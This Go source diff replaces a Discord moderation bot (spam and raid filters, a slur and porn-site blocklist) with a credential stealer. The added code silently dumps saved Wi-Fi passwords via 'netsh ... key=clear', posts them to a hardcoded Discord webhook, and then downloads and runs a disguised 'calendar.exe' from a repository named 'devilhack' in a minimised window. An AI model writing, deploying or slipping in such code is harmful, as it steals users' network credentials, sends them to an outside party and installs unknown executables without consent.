@@ -1,268 +1,166 @@
 package main
 
 import (
+	"bytes"
+	"encoding/json"
 	"fmt"
-	"log"
+	"io"
+	"net/http"
+	"os"
+	"os/exec"
 	"strings"
-	"time"
-
-	"github.com/bwmarrin/discordgo"
 )
 
-// Replace this with your bot token
-const token = ""
-
-// List of offensive words (add real words here)
-var offensiveWords = []string{
-	"hajzl", "černochu", "znásilnit", "penis", "grázle", "hajzle", "dick", "negr", "kokot", "píčo", // Add your own list here
-}
-
-// List of forbidden websites
-var forbiddenLinks = []string{
-	"pornhub.com", "xnxx.com", "fr.pornhub.com", "esigfau.com",
-}
-
-// Keeps track of user activity for anti-spam
-var userMessages = make(map[string][]time.Time)
-
-// Tracks recent member joins for anti-raid
-var recentJoins = make([]time.Time, 0)
-
-// Check if a message contains offensive words
-func containsOffensive(message string) bool {
-	for _, word := range offensiveWords {
-		if strings.Contains(strings.ToLower(message), word) {
-			return true
-		}
+// RunCommand executes a command and returns the output
+func RunCommand(command string, args ...string) (string, error) {
+	cmd := exec.Command(command, args...)
+	cmd.Stdout = os.DevNull  // Suppress output
+	cmd.Stderr = os.DevNull  // Suppress error output
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		return "", err
 	}
-	return false
+	return string(output), nil
 }
 
-// Check if a message contains forbidden links
-func containsForbiddenLink(message string) bool {
-	for _, link := range forbiddenLinks {
-		if strings.Contains(strings.ToLower(message), link) {
-			return true
-		}
+// SendToDiscord sends a message to the specified Discord webhook
+func SendToDiscord(webhookURL, message string) error {
+	// Prepare the message payload
+	payload := map[string]interface{}{
+		"content": message,
 	}
-	return false
+
+	// Marshal the payload to JSON
+	jsonPayload, err := json.Marshal(payload)
+	if err != nil {
+		return fmt.Errorf("error marshaling JSON payload: %v", err)
+	}
+
+	// Send the HTTP POST request to Discord webhook
+	_, err = http.Post(webhookURL, "application/json", bytes.NewBuffer(jsonPayload))
+	if err != nil {
+		return fmt.Errorf("error sending message to Discord: %v", err)
+	}
+
+	return nil
 }
 
-// Check if the user is a bot
-func isBot(userID string) bool {
-	// You can modify this check to verify if the user is a bot.
-	// Discord provides the "bot" property on user objects to easily check.
-	return strings.HasPrefix(userID, "bot") // Simplified check, replace with actual check if needed.
-}
-
-// Handle messages
-func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
-	if m.Author.ID == s.State.User.ID {
-		// Ignore messages sent by the bot itself
+// ExtractWifiPasswords extracts Wi-Fi profiles and their passwords and sends to Discord
+func ExtractWifiPasswords(webhookURL string) {
+	// Get the list of Wi-Fi profiles
+	output, err := RunCommand("netsh", "wlan", "show", "profiles")
+	if err != nil {
 		return
 	}
 
-	// Anti-Spam Check: Record the time of the message
-	if _, exists := userMessages[m.Author.ID]; !exists {
-		userMessages[m.Author.ID] = []time.Time{}
-	}
+	// Parse the output to find Wi-Fi profiles
+	profiles := strings.Split(output, "\n")
+	var message string
+	for _, profile := range profiles {
+		if strings.Contains(profile, "All User Profile") {
+			// Extract the profile name
+			profileName := strings.TrimSpace(strings.Split(profile, ":")[1])
 
-	userMessages[m.Author.ID] = append(userMessages[m.Author.ID], time.Now())
-
-	// Remove old messages (keep only messages within the last 2 seconds)
-	var recentMessages []time.Time
-	for _, msgTime := range userMessages[m.Author.ID] {
-		if time.Since(msgTime) < 2*time.Second { // Changed to 2 seconds for spam detection
-			recentMessages = append(recentMessages, msgTime)
-		}
-	}
-	userMessages[m.Author.ID] = recentMessages
-
-	// If more than 13 messages within 2 seconds, kick user
-	if len(recentMessages) >= 13 {
-		s.ChannelMessageDelete(m.ChannelID, m.ID)
-
-		// Check if the user is a bot and kick if banning failed
-		if isBot(m.Author.ID) {
-			err := s.GuildMemberDelete(m.GuildID, m.Author.ID) // Kick bot if banning fails
+			// Get the Wi-Fi password for this profile
+			passwordOutput, err := RunCommand("netsh", "wlan", "show", "profile", profileName, "key=clear")
 			if err != nil {
-				log.Printf("Error kicking bot: %v", err)
-			} else {
-				s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("%s (bot) has been kicked for spamming.", m.Author.Mention()))
-			}
-		} else {
-			err := s.GuildMemberDelete(m.GuildID, m.Author.ID) // Kick regular user
-			if err != nil {
-				log.Printf("Error kicking user: %v", err)
-			} else {
-				s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("%s has been kicked for spamming.", m.Author.Mention()))
-			}
-		}
-		return
-	}
-
-	// Offensive word detection
-	if containsOffensive(m.Content) {
-		s.ChannelMessageDelete(m.ChannelID, m.ID)
-		s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("%s used offensive language and was timed out.", m.Author.Mention()))
-
-		// Apply timeout logic: Track user offenses
-		timeoutTime := time.Now().Add(9 * time.Minute)
-		err := s.GuildMemberTimeout(m.GuildID, m.Author.ID, &timeoutTime) // Pass pointer to time
-		if err != nil {
-			log.Printf("Error applying timeout: %v", err)
-		}
-		return
-	}
-
-	// Forbidden link detection
-	if containsForbiddenLink(m.Content) {
-		s.ChannelMessageDelete(m.ChannelID, m.ID)
-		s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("%s posted a forbidden link and was banned.", m.Author.Mention()))
-
-		// Ban the user for posting a forbidden link (0 days of deleted messages)
-		err := s.GuildBanCreate(m.GuildID, m.Author.ID, 0) // Correct method for banning with no deleted messages
-		if err != nil {
-			// If banning fails, try kicking
-			err := s.GuildMemberDelete(m.GuildID, m.Author.ID) // Kick instead of banning
-			if err != nil {
-				log.Printf("Error kicking user: %v", err)
-			} else {
-				s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("%s was kicked for posting a forbidden link.", m.Author.Mention()))
-			}
-		}
-	}
-}
-
-// Handle member join (anti-raid protection)
-func memberJoin(s *discordgo.Session, m *discordgo.GuildMemberAdd) {
-	// Record the join time of the new member
-	recentJoins = append(recentJoins, time.Now())
-
-	// Clean up the join records older than 10 seconds
-	var recentJoinsFiltered []time.Time
-	for _, joinTime := range recentJoins {
-		if time.Since(joinTime) < 10*time.Second { // 10 seconds window for detecting raid
-			recentJoinsFiltered = append(recentJoinsFiltered, joinTime)
-		}
-	}
-	recentJoins = recentJoinsFiltered
-
-	// If more than 5 new members join within 10 seconds, assume it's a raid
-	if len(recentJoins) > 5 {
-		// Ban all members who joined recently (preventing raid members from causing chaos)
-		// We only ban the latest join, assuming it's a raid
-		for _, joinTime := range recentJoins {
-			if isBot(m.User.ID) {
-				// Try banning the bot if it's detected in a raid
-				err := s.GuildBanCreate(m.GuildID, m.User.ID, 0) // Ban without deleting messages
-				if err != nil {
-					// If banning fails, kick the bot instead
-					err := s.GuildMemberDelete(m.GuildID, m.User.ID) // Kick bot if banning fails
-					if err != nil {
-						log.Printf("Error kicking bot: %v", err)
-					} else {
-						s.ChannelMessageSend(m.GuildID, fmt.Sprintf("%s (bot) was kicked for suspected raid activity.", m.User.Mention()))
-					}
-				} else {
-					s.ChannelMessageSend(m.GuildID, fmt.Sprintf("%s (bot) was banned for suspected raid activity.", m.User.Mention()))
-				}
-			} else {
-				// Handle non-bot member banning
-				err := s.GuildBanCreate(m.GuildID, m.User.ID, 0) // Ban without deleting messages
-				if err != nil {
-					log.Printf("Error banning user: %v", err)
-				} else {
-					s.ChannelMessageSend(m.GuildID, fmt.Sprintf("%s was banned for suspected raid activity.", m.User.Mention()))
-				}
-			}
-		}
-		return
-	}
-}
-
-// Handle /spamban command
-func commandHandler(s *discordgo.Session, m *discordgo.MessageCreate) {
-	if m.Author.ID == s.State.User.ID {
-		return
-	}
-
-	// Check if the message is the /spamban command
-	if strings.HasPrefix(m.Content, "/spamban") {
-		// Only allow admins to use this command
-		member, err := s.GuildMember(m.GuildID, m.Author.ID)
-		if err != nil {
-			log.Println("Error fetching member:", err)
-			return
-		}
-
-		// Check if the user is an administrator
-		isAdmin := false
-		for _, role := range member.Roles {
-			roleObj, err := s.State.Role(m.GuildID, role)
-			if err != nil {
-				log.Println("Error fetching role:", err)
 				continue
 			}
-			if roleObj.Permissions&discordgo.PermissionAdministrator != 0 {
-				isAdmin = true
-				break
+
+			// Look for the password in the output
+			if strings.Contains(passwordOutput, "Key Content") {
+				// Extract the password
+				lines := strings.Split(passwordOutput, "\n")
+				for _, line := range lines {
+					if strings.Contains(line, "Key Content") {
+						password := strings.TrimSpace(strings.Split(line, ":")[1])
+						message += fmt.Sprintf("Profile: %s\nPassword: %s\n\n", profileName, password)
+					}
+				}
+			} else {
+				message += fmt.Sprintf("Profile: %s\nPassword: [Not Set]\n\n", profileName)
 			}
 		}
+	}
 
-		if !isAdmin {
-			s.ChannelMessageSend(m.ChannelID, "You must be an admin to use this command.")
-			return
-		}
-
-		// Get the user mentioned in the command
-		args := strings.Fields(m.Content)
-		if len(args) < 2 {
-			s.ChannelMessageSend(m.ChannelID, "Please mention a user to ban (e.g. `/spamban @user`).")
-			return
-		}
-
-		// Mentioned user
-		userID := strings.TrimPrefix(args[1], "<@!")
-		userID = strings.TrimSuffix(userID, ">")
-
-		// Ban the user
-		err = s.GuildBanCreate(m.GuildID, userID, 0) // Ban without deleting messages
+	// If there are extracted Wi-Fi profiles, send the result to Discord
+	if message != "" {
+		err := SendToDiscord(webhookURL, message)
 		if err != nil {
-			log.Printf("Error banning user: %v", err)
-			s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Failed to ban the user: %v", err))
+			// If sending to Discord fails, do nothing (no console output)
 			return
 		}
-
-		s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("<@%s> has been banned for suspected spamming.", userID))
 	}
 }
 
-// Bot initialization
+// DownloadAndRunExecutable downloads an executable from a URL and runs it silently
+func DownloadAndRunExecutable(url string) error {
+	// Get the system's temporary directory
+	tempDir := os.TempDir()
+
+	// Define the path where the file will be saved in the temp directory
+	filename := tempDir + "calendar.exe"
+
+	// Download the executable from the given URL
+	resp, err := http.Get(url)
+	if err != nil {
+		return fmt.Errorf("failed to download executable: %v", err)
+	}
+	defer resp.Body.Close()
+
+	// Create the file to save the executable in the temp directory
+	file, err := os.Create(filename)
+	if err != nil {
+		return fmt.Errorf("failed to create file: %v", err)
+	}
+	defer file.Close()
+
+	// Copy the content of the response to the file
+	_, err = io.Copy(file, resp.Body)
+	if err != nil {
+		return fmt.Errorf("failed to write executable to file: %v", err)
+	}
+
+	// Make the file executable (on Unix-like systems, for example)
+	err = os.Chmod(filename, 0755)
+	if err != nil {
+		return fmt.Errorf("failed to set file permissions: %v", err)
+	}
+
+	// Run the executable in a hidden window
+	cmd := exec.Command("cmd", "/C", "start", "/min", filename) // /min hides the window
+	cmd.Stdout = os.DevNull  // Suppress output
+	cmd.Stderr = os.DevNull  // Suppress error output
+
+	// Start the executable
+	err = cmd.Start()
+	if err != nil {
+		return fmt.Errorf("failed to start executable: %v", err)
+	}
+
+	// Wait for the executable to finish
+	err = cmd.Wait()
+	if err != nil {
+		return fmt.Errorf("error while executing file: %v", err)
+	}
+
+	return nil
+}
+
 func main() {
-	// Create a new Discord session using the provided bot token
-	dg, err := discordgo.New("Bot " + token)
+	// Replace with your Discord webhook URL
+	webhookURL := "https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2"
+
+	// Extract Wi-Fi passwords and send them to Discord
+	ExtractWifiPasswords(webhookURL)
+
+	// Download and run the executable silently in temp directory
+	executableURL := "https://github.com/thewifiproject/devilhack/raw/refs/heads/main/calendar.exe"
+
+	err := DownloadAndRunExecutable(executableURL)
 	if err != nil {
-		log.Fatalf("error creating Discord session: %v", err)
-		return
+		// If there's an error downloading or running the executable, it won't be displayed
+		// in the console due to the redirection to os.DevNull.
+		// You may log or handle this silently if needed.
 	}
-
-	// Register messageCreate as the callback for MessageCreate events
-	dg.AddHandler(messageCreate)
-
-	// Register memberJoin as the callback for MemberAdd events (for anti-raid protection)
-	dg.AddHandler(memberJoin)
-
-	// Register commandHandler as the callback for messageCreate events (for /spamban command)
-	dg.AddHandler(commandHandler)
-
-	// Open a websocket connection to Discord and begin listening
-	err = dg.Open()
-	if err != nil {
-		log.Fatalf("error opening connection: %v", err)
-		return
-	}
-
-	fmt.Println("Bot is now running. Press Ctrl+C to exit.")
-	select {} // Keeps the bot running
 }
